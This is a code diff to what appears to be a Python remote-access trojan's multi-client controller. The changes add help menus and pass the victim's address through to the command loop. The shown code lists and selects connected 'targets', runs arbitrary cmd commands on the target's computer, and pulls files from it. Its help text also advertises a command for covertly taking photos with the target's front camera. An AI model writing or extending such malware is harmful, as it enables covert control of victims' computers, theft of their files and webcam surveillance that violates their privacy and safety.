@@ -108,18 +108,29 @@ def receive_file(client_socket, filename):
         print(f"An error occurred during file reception: {e}")
 
 
-
-
-
-
-
-
-
-
-
-
 #############################################################################################
 #############################################################################################
+
+help1 = """1. list      ->   list all connections.
+           2. select    ->   target a connection.
+           3. help      ->   show all commands.
+"""
+
+
+help2 = """ 
+You can run all cmd commands here.those all execute on target`s computer.And you also can use
+these util-commands :-->
+            1. get      ->   pull a file from target
+            2. pik      ->   take a photo with target`s front camera.
+            3.
+
+
+"""
+
+
+
+##############################################################################################
+############################################################################################
 NUMBER_OF_THREATS = 2
 JOB_NUMBERS = [1,2]
 queue = Queue()
@@ -193,9 +204,12 @@ def start_turtle():
         if cmd == 'list':
             list_connection()
         elif 'select' in cmd:
-            conn = select_target(cmd)
+            conn,addr = select_target(cmd)
             if conn is not None:
-                send_target_command(conn)
+                send_target_command(conn,addr)
+        elif cmd == 'help':
+            print(help1)
+
 
         else:
             print("Command not recoginised")
@@ -222,21 +236,24 @@ def select_target(cmd):
         target = cmd.replace('select ','')
         target = int(target)
         conn = all_connections[target]
+        addr = all_address[target]
         print("you are now connected to : " + str(all_address[target][0]))
         print(str(all_address[target][0]) +">",end="")
-        return conn
+        return conn,addr
     except:
         print("Selection not valid")
         return None
   
-def send_target_command(conn):
-    #tem_addr = all_address[all_connections.index(conn)]
+def send_target_command(conn,addr):
         
     while True:
         try:
             cmd = input()
             if cmd == "quit":
                 break
+            elif cmd == "help":
+                print(help2)
+                print(str(addr[0]) +"> ",end="")
             elif cmd[:3] == "get":
                 conn.send(str.encode(cmd))
                 receive_file(conn,cmd[4:])
